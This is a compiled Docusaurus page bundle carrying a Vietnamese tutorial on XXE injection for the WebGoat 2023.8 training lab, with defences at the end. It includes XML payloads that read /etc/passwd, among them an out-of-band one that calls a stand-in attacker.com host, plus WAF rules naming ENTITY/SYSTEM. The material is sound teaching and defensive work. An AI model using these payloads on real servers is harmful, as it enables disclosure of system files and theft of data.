"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[5709],{28453:(n,e,t)=>{t.d(e,{R:()=>c,x:()=>l});var i=t(96540);const s={},r=i.createContext(s);function c(n){const e=i.useContext(r);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:c(n.components),i.createElement(r.Provider,{value:e},n.children)}},67311:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>c,default:()=>d,frontMatter:()=>r,metadata:()=>l,toc:()=>h});var i=t(74848),s=t(28453);const r={title:"1.02 | XXE",slug:"XXE-02",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},c=void 0,l={id:"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02",title:"1.02 | XXE",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",source:"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02.md",sourceDirName:"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration",slug:"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02",draft:!1,unlisted:!1,editUrl:"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02.md",tags:[{inline:!0,label:"web-security",permalink:"/docs/tags/web-security"},{inline:!0,label:"webgoat",permalink:"/docs/tags/webgoat"},{inline:!0,label:"security-misconfiguration",permalink:"/docs/tags/security-misconfiguration"},{inline:!0,label:"xxe",permalink:"/docs/tags/xxe"},{inline:!0,label:"webgoat-2023.8",permalink:"/docs/tags/webgoat-2023-8"}],version:"current",lastUpdatedAt:1755314501e3,sidebarPosition:1,frontMatter:{title:"1.02 | XXE",slug:"XXE-02",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},sidebar:"tutorialSidebar",previous:{title:"1.01 | XXE",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-01"},next:{title:"1.03 | XXE",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-03"}},o={},h=[{value:"\ud83d\udccc <strong>1. XML Entity l\xe0 g\xec?</strong>",id:"-1-xml-entity-l\xe0-g\xec",level:2},{value:"\ud83d\udd25 <strong>2. XML Parser v\xe0 c\xe1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng</strong>",id:"-2-xml-parser-v\xe0-c\xe1ch-th\u1ee9c-ho\u1ea1t-\u0111\u1ed9ng",level:2},{value:"\ud83d\udea8 <strong>3. XXE Injection l\xe0 g\xec?</strong>",id:"-3-xxe-injection-l\xe0-g\xec",level:2},{value:"\ud83d\udca3 <strong>4. C\xe1c d\u1ea1ng XXE t\u1ea5n c\xf4ng ph\u1ed5 bi\u1ebfn</strong>",id:"-4-c\xe1c-d\u1ea1ng-xxe-t\u1ea5n-c\xf4ng-ph\u1ed5-bi\u1ebfn",level:2},{value:"\ud83d\udd39 <strong>1. Classic XXE (Ti\u1ebft l\u1ed9 file h\u1ec7 th\u1ed1ng)</strong>",id:"-1-classic-xxe-ti\u1ebft-l\u1ed9-file-h\u1ec7-th\u1ed1ng",level:3},{value:"\ud83d\udd39 <strong>2. Blind XXE (Kh\xf4ng c\xf3 ph\u1ea3n h\u1ed3i tr\u1ef1c ti\u1ebfp)</strong>",id:"-2-blind-xxe-kh\xf4ng-c\xf3-ph\u1ea3n-h\u1ed3i-tr\u1ef1c-ti\u1ebfp",level:3},{value:"\ud83d\udd39 <strong>3. Error-based XXE</strong>",id:"-3-error-based-xxe",level:3},{value:"\ud83d\udee1 <strong>5. C\xe1ch ph\xf2ng ch\u1ed1ng XXE</strong>",id:"-5-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",level:2}];function a(n){const e={blockquote:"blockquote",br:"br",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["\ud83d\udd0d ",(0,i.jsx)(e.strong,{children:"XML Entities & XXE Injection"})]}),"\n"]}),"\n",(0,i.jsxs)(e.h2,{id:"-1-xml-entity-l\xe0-g\xec",children:["\ud83d\udccc ",(0,i.jsx)(e.strong,{children:"1. XML Entity l\xe0 g\xec?"})]}),"\n",(0,i.jsxs)(e.p,{children:["Trong XML, ",(0,i.jsx)(e.strong,{children:"Entity"})," l\xe0 c\xe1c th\xe0nh ph\u1ea7n c\xf3 th\u1ec3 thay th\u1ebf b\u1eb1ng n\u1ed9i dung c\u1ee5 th\u1ec3 khi XML \u0111\u01b0\u1ee3c parse. C\xf3 3 lo\u1ea1i ch\xednh:",(0,i.jsx)(e.br,{}),"\n","1\ufe0f\u20e3 ",(0,i.jsx)(e.strong,{children:"Internal Entity"})," \u2013 \u0110\u01b0\u1ee3c \u0111\u1ecbnh ngh\u0129a trong DTD, ch\u1ec9 s\u1eed d\u1ee5ng trong t\xe0i li\u1ec7u XML.",(0,i.jsx)(e.br,{}),"\n","2\ufe0f\u20e3 ",(0,i.jsx)(e.strong,{children:"External Entity"})," \u2013 Tham chi\u1ebfu \u0111\u1ebfn d\u1eef li\u1ec7u b\xean ngo\xe0i nh\u01b0 file h\u1ec7 th\u1ed1ng ho\u1eb7c URL.",(0,i.jsx)(e.br,{}),"\n","3\ufe0f\u20e3 ",(0,i.jsx)(e.strong,{children:"Parameter Entity"})," \u2013 \u0110\u01b0\u1ee3c s\u1eed d\u1ee5ng trong n\u1ed9i b\u1ed9 DTD \u0111\u1ec3 t\xe1i s\u1eed d\u1ee5ng n\u1ed9i dung."]}),"\n",(0,i.jsxs)(e.p,{children:["V\xed d\u1ee5 v\u1ec1 ",(0,i.jsx)(e.strong,{children:"Internal Entity"}),":"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE users [\n    <!ENTITY js "Jo Smith">\n]>\n<user>\n    <name>&js;</name>\n</user>\n'})}),"\n",(0,i.jsxs)(e.p,{children:["Khi XML parser x\u1eed l\xfd, ",(0,i.jsx)(e.code,{children:"&js;"})," s\u1ebd \u0111\u01b0\u1ee3c thay th\u1ebf b\u1eb1ng ",(0,i.jsx)(e.code,{children:'"Jo Smith"'}),"."]}),"\n",(0,i.jsxs)(e.h2,{id:"-2-xml-parser-v\xe0-c\xe1ch-th\u1ee9c-ho\u1ea1t-\u0111\u1ed9ng",children:["\ud83d\udd25 ",(0,i.jsx)(e.strong,{children:"2. XML Parser v\xe0 c\xe1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng"})]}),"\n",(0,i.jsxs)(e.p,{children:["H\u1ec7 th\u1ed1ng s\u1eed d\u1ee5ng ",(0,i.jsx)(e.strong,{children:"XML parsers"})," \u0111\u1ec3 x\u1eed l\xfd XML v\xe0 c\xf3 th\u1ec3 t\u1ef1 \u0111\u1ed9ng \xe1nh x\u1ea1 d\u1eef li\u1ec7u v\xe0o c\xe1c \u0111\u1ed1i t\u01b0\u1ee3ng trong \u1ee9ng d\u1ee5ng."]}),"\n",(0,i.jsx)(e.p,{children:"V\xed d\u1ee5 trong Java:"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-java",children:"@XmlRootElement\nclass User {\n    public String name;\n}\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u1ee8ng d\u1ee5ng c\xf3 th\u1ec3 nh\u1eadn XML t\u1eeb client v\xe0 chuy\u1ec3n th\xe0nh \u0111\u1ed1i t\u01b0\u1ee3ng ",(0,i.jsx)(e.code,{children:"User"}),"."]}),"\n",(0,i.jsxs)(e.h2,{id:"-3-xxe-injection-l\xe0-g\xec",children:["\ud83d\udea8 ",(0,i.jsx)(e.strong,{children:"3. XXE Injection l\xe0 g\xec?"})]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:"XXE (XML External Entity Injection)"})," l\xe0 k\u1ef9 thu\u1eadt t\u1ea5n c\xf4ng khi \u1ee9ng d\u1ee5ng x\u1eed l\xfd XML \u0111\u1ea7u v\xe0o m\xe0 kh\xf4ng v\xf4 hi\u1ec7u h\xf3a External Entity. \u0110i\u1ec1u n\xe0y c\xf3 th\u1ec3 d\u1eabn \u0111\u1ebfn:",(0,i.jsx)(e.br,{}),"\n","\u2714 ",(0,i.jsx)(e.strong,{children:"\u0110\u1ecdc file nh\u1ea1y c\u1ea3m"})," (",(0,i.jsx)(e.code,{children:"/etc/passwd"}),", ",(0,i.jsx)(e.code,{children:"C:\\Windows\\System32\\drivers\\etc\\hosts"}),")",(0,i.jsx)(e.br,{}),"\n","\u2714 ",(0,i.jsx)(e.strong,{children:"T\u1ea5n c\xf4ng DoS"}),' (b\u1eb1ng "Billion Laughs Attack")',(0,i.jsx)(e.br,{}),"\n","\u2714 ",(0,i.jsx)(e.strong,{children:"SSRF"})," (y\xeau c\u1ea7u \u0111\u1ebfn API n\u1ed9i b\u1ed9, d\u1ecbch v\u1ee5 cloud)",(0,i.jsx)(e.br,{}),"\n","\u2714 ",(0,i.jsx)(e.strong,{children:"Qu\xe9t c\u1ed5ng v\xe0 pivoting"})," (s\u1eed d\u1ee5ng \u1ee9ng d\u1ee5ng l\xe0m c\u1ea7u n\u1ed1i \u0111\u1ebfn h\u1ec7 th\u1ed1ng kh\xe1c)",(0,i.jsx)(e.br,{}),"\n","\u2714 ",(0,i.jsx)(e.strong,{children:"Th\u1ef1c thi m\xe3 \u0111\u1ed9c"})," (n\u1ebfu XML parser c\xf3 l\u1ed7i b\u1ed9 nh\u1edb)"]}),"\n",(0,i.jsxs)(e.h2,{id:"-4-c\xe1c-d\u1ea1ng-xxe-t\u1ea5n-c\xf4ng-ph\u1ed5-bi\u1ebfn",children:["\ud83d\udca3 ",(0,i.jsx)(e.strong,{children:"4. C\xe1c d\u1ea1ng XXE t\u1ea5n c\xf4ng ph\u1ed5 bi\u1ebfn"})]}),"\n",(0,i.jsxs)(e.h3,{id:"-1-classic-xxe-ti\u1ebft-l\u1ed9-file-h\u1ec7-th\u1ed1ng",children:["\ud83d\udd39 ",(0,i.jsx)(e.strong,{children:"1. Classic XXE (Ti\u1ebft l\u1ed9 file h\u1ec7 th\u1ed1ng)"})]}),"\n",(0,i.jsxs)(e.p,{children:["Payload \u0111\u1ecdc ",(0,i.jsx)(e.code,{children:"/etc/passwd"}),":"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE data [\n    <!ENTITY file SYSTEM "file:///etc/passwd">\n]>\n<data>&file;</data>\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u23e9 N\u1ebfu server kh\xf4ng ch\u1eb7n External Entity, n\xf3 s\u1ebd tr\u1ea3 v\u1ec1 n\u1ed9i dung file ",(0,i.jsx)(e.code,{children:"/etc/passwd"}),"."]}),"\n",(0,i.jsxs)(e.h3,{id:"-2-blind-xxe-kh\xf4ng-c\xf3-ph\u1ea3n-h\u1ed3i-tr\u1ef1c-ti\u1ebfp",children:["\ud83d\udd39 ",(0,i.jsx)(e.strong,{children:"2. Blind XXE (Kh\xf4ng c\xf3 ph\u1ea3n h\u1ed3i tr\u1ef1c ti\u1ebfp)"})]}),"\n",(0,i.jsxs)(e.p,{children:["N\u1ebfu \u1ee9ng d\u1ee5ng kh\xf4ng hi\u1ec3n th\u1ecb l\u1ed7i ho\u1eb7c n\u1ed9i dung file, hacker c\xf3 th\u1ec3 d\xf9ng ",(0,i.jsx)(e.strong,{children:"out-of-band (OOB) attack"}),":"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-xml",children:'<!DOCTYPE data [\n    <!ENTITY xxe SYSTEM "http://attacker.com/log?data=/etc/passwd">\n]>\n<data>&xxe;</data>\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u23e9 N\u1ebfu server g\u1eedi request \u0111\u1ebfn ",(0,i.jsx)(e.code,{children:"attacker.com"}),", hacker bi\u1ebft h\u1ec7 th\u1ed1ng b\u1ecb d\xednh XXE."]}),"\n",(0,i.jsxs)(e.h3,{id:"-3-error-based-xxe",children:["\ud83d\udd39 ",(0,i.jsx)(e.strong,{children:"3. Error-based XXE"})]}),"\n",(0,i.jsx)(e.p,{children:"L\u1ee3i d\u1ee5ng l\u1ed7i x\u1eed l\xfd XML \u0111\u1ec3 r\xf2 r\u1ec9 d\u1eef li\u1ec7u qua th\xf4ng b\xe1o l\u1ed7i:"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-xml",children:'<!DOCTYPE foo [\n    <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n    <!ENTITY file "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>">\n]>\n<user>&file;</user>\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u23e9 N\u1ebfu parser ph\u1ea3n h\u1ed3i l\u1ed7i ch\u1ee9a n\u1ed9i dung file, hacker c\xf3 th\u1ec3 khai th\xe1c."}),"\n",(0,i.jsxs)(e.h2,{id:"-5-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",children:["\ud83d\udee1 ",(0,i.jsx)(e.strong,{children:"5. C\xe1ch ph\xf2ng ch\u1ed1ng XXE"})]}),"\n",(0,i.jsxs)(e.p,{children:["\u2705 ",(0,i.jsx)(e.strong,{children:"V\xf4 hi\u1ec7u h\xf3a DTD & External Entity trong XML Parser"}),(0,i.jsx)(e.br,{}),"\n","Trong Java:"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-java",children:'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n'})}),"\n",(0,i.jsx)(e.p,{children:"Trong .NET:"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-csharp",children:"XmlReaderSettings settings = new XmlReaderSettings();\nsettings.DtdProcessing = DtdProcessing.Prohibit;\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u2705 ",(0,i.jsx)(e.strong,{children:"D\xf9ng JSON thay v\xec XML"}),(0,i.jsx)(e.br,{}),"\n","JSON kh\xf4ng h\u1ed7 tr\u1ee3 entity \u2192 an to\xe0n h\u01a1n."]}),"\n",(0,i.jsxs)(e.p,{children:["\u2705 ",(0,i.jsx)(e.strong,{children:"H\u1ea1n ch\u1ebf quy\u1ec1n truy c\u1eadp file tr\xean server"}),(0,i.jsx)(e.br,{}),"\n","D\xf9ng ",(0,i.jsx)(e.strong,{children:"chroot, SELinux"})," \u0111\u1ec3 gi\u1edbi h\u1ea1n truy c\u1eadp file h\u1ec7 th\u1ed1ng."]}),"\n",(0,i.jsxs)(e.p,{children:["\u2705 ",(0,i.jsx)(e.strong,{children:"S\u1eed d\u1ee5ng WAF (Web Application Firewall)"}),(0,i.jsx)(e.br,{}),"\n","Ch\u1eb7n payload ch\u1ee9a ",(0,i.jsx)(e.code,{children:"<!ENTITY"})," ho\u1eb7c ",(0,i.jsx)(e.code,{children:"SYSTEM"}),"."]})]})}function d(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(a,{...n})}):a(n)}}}]);